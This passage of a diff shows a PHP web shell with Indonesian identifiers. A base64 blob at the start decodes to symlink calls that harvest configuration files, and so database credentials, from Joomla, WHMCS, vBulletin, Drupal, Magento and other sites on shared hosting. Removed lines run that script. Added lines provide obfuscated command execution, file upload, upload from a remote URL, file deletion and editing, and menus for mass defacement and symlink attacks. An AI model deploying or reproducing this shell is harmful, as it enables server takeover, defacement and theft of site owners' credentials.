ZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtaG9tZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmJ+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIzfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jYy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIxfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobTE1LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tY2VudHJhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0td2htY3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL1dITUNTL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLVdITUNTLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htYy1XSE0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNwYW5lbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXBhbmVsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VibWl0dGlja2V0LnBocCcsJHNpdGVzcy4nLXdobWNzMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbWFuYWdlLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9teS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW15c2hvcC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictemVuY2FydC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1aQ3Nob3AudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc21mL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZjIudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW1zL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bXMudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJ0aWNsZS9jb25maWcucGhwJywkc2l0ZXNzLictTndhaHkudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy11cDIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZl9nbG9iYWwucGhwJywkc2l0ZXNzLictNi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlL2RiLnBocCcsJHNpdGVzcy4nLTcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29ubmVjdC5waHAnLCRzaXRlc3MuJy1QSFAtRnVzaW9uLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21rX2NvbmYucGhwJywkc2l0ZXNzLictOS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJHNpdGVzcy4nLURydXBhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXIvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy0xbWVtYmVyLnR4dCcpIDsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5ncy50eHQnKSA7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3JlcXVpcmVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1BTTRTUy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1cHBvcnRzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1zdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtYmlsbGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1iaWxsaW5ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0L2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3QudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdHMvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGluZy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmdzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RpbmdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RiaWxsaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcC9ldGMvbG9jYWwueG1sJywkc2l0ZXNzLictTWFnZW50by50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictT3BlbmNhcnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCRzaXRlc3MuJy1QcmVzdGFzaG9wLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy9rb25la3NpLnBocCcsJHNpdGVzcy4nLUxva29tZWRpYS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9sb2tvbWVkaWEvY29uZmlnL2tvbmVrc2kucGhwJywkc2l0ZXNzLictTG9rb21lZGlhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NsY29uZmlnLnBocCcsJHNpdGVzcy4nLVNpdGVsb2NrLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCRzaXRlc3MuJy1FbGxpc2xhYi50eHQnKTsNCn0NCnByaW50ICJMb2NhdGlvbjogLi9cblxuIjs=";
-		$file = "kaliinirisu_config/vhost.cin";
-		$handle = $moonafic[27]($file ,"w+");
-		$moonafic[35]($handle ,$moonafic[19]($vhost));
-		$moonafic[46]($handle);
-		$moonafic[7]($file, 0755);
-		if($moonafic[21]("cd kaliinirisu_config && ./vhost.cin")) {
-			echo "<center><a class='iofibrainwash' href='$link_config/kaliinirisu_config'><font color=lime>Done</font></a></center>";
-		} else {
-			echo "<center><a class='iofibrainwash' href='$link_config/kaliinirisu_config/vhost.cin'><font color=lime>Done</font></a></center>";
+}
+
+function xrmdir($dir) {
+    $items = scandir($dir);
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') {
+            continue;
+        }
+        $path = $dir.'/'.$item;
+        if (is_dir($path)) {
+            xrmdir($path);
+        } else {
+            unlink($path);
+        }
+    }
+    rmdir($dir);
+}
+
+function dunlut($file) {
+    if (!is_readable($file)) {
+        red("Cannot Download File / Unreadable File !");
+        die();
+    }
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($file).'"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($filepath));
+    flush();
+    readfile($file);
+    die();
+}
+
+function owner($file) {
+    if (function_exists("posix_getpwuid")) {
+        $tod = @posix_getpwuid(fileowner($file));
+        return "<center>".$tod['name']."</center>";
+    } else {
+        return "<center>".fileowner($file)."</center>";
+    }
+}
+
+function cekwrite($lokasi) {
+    $izin = substr(sprintf('%o', fileperms($lokasi)), -4);
+    if (is_writable($lokasi)) {
+        return "<font color=green>".$izin."</font>";
+    } else {
+        return "<font color=red>".$izin."</font>";
+    }
+}
+
+function ekse($komend, $lokasi) {
+    if (!function_exists("proc_open")) {
+        die("proc_open function disabled !");
+    } elseif (!function_exists("base64_decode")) {
+        die("base64_decode function disabled !");
+    }
+    $komen = base64_decode(base64_decode(base64_decode($komend)));
+    $tod = @proc_open($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pipes, $lokasi);
+    echo "<textarea rows='25' cols='100'>".htmlspecialchars(stream_get_contents($pipes[1]))."</textarea><br><br>";
+}
+
+function ipserv() {
+    if (empty($_SERVER['SERVER_ADDR'])) {
+        return gethostbyname($_SERVER['SERVER_NAME']);
+        if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
+            return $_SERVER['SERVER_NAME'];
+        }
+    } else {
+        return $_SERVER['SERVER_ADDR'];
+    }
+}
+
+function cekfile($file) {
+     return '<i class="fa fa-file" style="color: #d6d4ce"></i> ';
+}
+
+function filedate($file) {
+    return date("F d Y g:i:s", filemtime($file));
+}
+
+function unzip($file, $lokasi) {
+    if (!is_readable($file)) {
+        red("Cannot Unzip File / Unreadable File !");
+        die();
+    } elseif (strpos(file_get_contents($file), "\x50\x4b\x03\x04") === false) {
+        red("This isn't Zip File !");
+        die();
+    }
+    $zip = new ZipArchive;
+    $res = $zip -> open($file);
+    if ($res == true) {
+        $zip -> extractTo($lokasi);
+        $zip -> close();
+        green("Success Unzip File !");
+    } else {
+        red("Failed to Unzip File !");
+    }
+}
+
+function green($text) {
+    echo "<center><font color='green'>".$text."</center></font>";
+}
+
+function red($text) {
+    echo "<center><font color='red'>".$text."</center></font>";
+}
+
+if (function_exists("mysql_connect")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo " &nbsp;|&nbsp; cURL : ";
+if (function_exists("curl_init")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo " &nbsp;|&nbsp; WGET : ";
+if (file_exists("/usr/bin/wget")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo " &nbsp;|&nbsp; Perl : ";
+if (file_exists("/usr/bin/perl")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo " &nbsp;|&nbsp; Python : ";
+if (file_exists("/usr/bin/python2")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+
+foreach($_POST as $key => $value){
+    $_POST[$key] = stripslashes($value);
+}
+
+if(isset($_GET['path'])){
+    $lokasi = $_GET['path'];
+    $lokdua = $_GET['path'];
+} else {
+    $lokasi = getcwd();
+    $lokdua = getcwd();
+}
+
+$lokasi = str_replace('\\','/',$lokasi);
+$lokasis = explode('/',$lokasi);
+$lokasinya = @scandir($lokasi);
+
+echo "<br>Directory (".cekwrite($lokasi).") : &nbsp;";
+
+foreach($lokasis as $id => $lok){
+    if($lok == '' && $id == 0){
+        $a = true;
+        echo '<a href="?path=/">/</a>';
+        continue;
+    }
+    if($lok == '') continue;
+    echo '<a href="?path=';
+    for($i=0;$i<=$id;$i++){
+    echo "$lokasis[$i]";
+    if($i != $id) echo "/";
+} 
+echo '">'.$lok.'</a>/';
+}
+
+echo '</td></tr><tr><td>';
+if (isset($_POST['upwkwk'])) {
+    if ($_POST['dirnya'] == "2") {
+            $lokasi = $_SERVER['DOCUMENT_ROOT'];
+        }
+    if (isset($_POST['berkasnya'])) {
+        $data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
+        if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
+            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
+        } else {
+            echo "<font color='red'>Failed to Upload !<br><br>";
+        }
+    } elseif (isset($_POST['linknya'])) {
+        if (empty($_POST['namalink'])) {
+            exit("Filename cannot be empty !");
+        }
+        if ($_POST['dirnya'] == "2") {
+            $lokasi = $_SERVER['DOCUMENT_ROOT'];
+        }
+        $data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
+        if (file_exists($lokasi."/".$_POST['namalink'])) {
+            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
+        } else {
+            echo "<font coloe='red'>Failed to Upload !<br><br>";
+        }
+    } elseif (isset($_POST['bepas'])) {
+        $bepasdata = $_POST['bepasdata'];
+        $bepasnama = $_POST['bepasnama'];
+        if ($bepasdata) {
+            echo "string";
+        }
+        @file_put_contents($lokasi."/".$bepasnama, $bepasdata);
+        if (file_exists($lokasi."/".$bepasnama)) {
+            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$bepasnama."</i></font><br><br>";
+        } else {
+            echo "<font coloe='red'>Failed to Upload !<br><br>";
+        }
+    }
+}
+
+echo "</table><br>";
+echo '<table width="100%" border="0" cellpadding="5" cellspacing="5" align="center">';
+echo '<th> &nbsp;<a class="button" href="'.$_SERVER['SCRIPT_NAME'].'">Home</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&komend=d7net">&#9741; Command</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&upload=d7net">&#9741; Upload File</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&info=d7net">&#9741;Info Server</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&buatfile=d7net">&#9741; Buat File</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&mass=d7net">&#9741; Mass deface</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&jump=d7net">&#9741; Jumping</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&config=d7net">&#9741; Config</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&symlink=d7net">&#9741; Symlink</a>&nbsp; </th>';
+echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&about=d7net">&#9741; About</a>&nbsp; </th>';
+echo "</table><br>";
+
+if (isset($_GET['fileloc'])) {
+    echo "<tr><td>Current File : ".$_GET['fileloc'];
+    echo '</tr></td></table><br/>';
+    echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
+    author();
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
+    if (is_dir($_POST['path'])) {
+        xrmdir($_POST['path']);
+        if (file_exists($_POST['path'])) {
+            red("Failed to delete Directory !");
+        } else {
+            green("Delete Directory Success !");
+        }
+    } elseif (is_file($_POST['path'])) {
+        @unlink($_POST['path']);
+        if (file_exists($_POST['path'])) {
+            red("Failed to Delete File !");
+        } else {
+            green("Delete File <i>".basename($_POST['path'])."</i> Success !");
+        }
+    }
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
+    if (isset($_POST['gantin'])) {
+        $ren = @rename($_POST['path'], $_POST['newname']);
+        if ($ren == true) {
+            green("Change Name Success !");
+        } else {
+            red("Change Name Failed !");
+        }
+    }
+    if (empty($_POST['name'])) {
+        $namaawal = $_POST['newname'];
+    } else {
+        $namawal = $_POST['name'];
+    }
+    echo "<center>".$_POST['path']."<br>";
+    echo '<form method="post">
+    New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
+    <input type="hidden" name="path" value="'.$_POST['path'].'">
+    <input type="hidden" name="pilih" value="gantinama">
+    <input type="submit" value="Change" name="gantin" class="button" style="cursor: pointer; border-color: #fff"/>
+    </form>';
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
+    if (isset($_POST['gasedit'])) {
+        $edit = @file_put_contents($_POST['path'], $_POST['src']);
+        if ($edit == true) {
+            green("Edit File Success !");
+        } else {
+            red("Edit File Failed !");
+        }
+    }
+    echo "<center>".$_POST['path']."<br><br>";
+    echo '<form method="post">
+    <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
+    <input type="hidden" name="path" value="'.$_POST['path'].'">
+    <input type="hidden" name="pilih" value="edit">
+    <input type="submit" value="Edit File" name="gasedit" class="button" />
+    </form><br>';
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "dunlut") {
+    dunlut($_POST['path']);
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "unzip") {
+    unzip($_POST['path'], $lokasi);
+} elseif ($_REQUEST['upload'] == "d7net") {
+    echo "<center>Upload File : ";
+    echo '<form enctype="multipart/form-data" method="post">
+<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
+<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
+<br>
+<input type="hidden" name="upwkwk" value="aplod">
+<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
+<br>403 Upload File<br>
+<input type="file" id="datanya" onchange="setfilename(this.value); loadFile(this.files[0])"/>
+<input type="hidden" name="bepasnama" id="namanya">
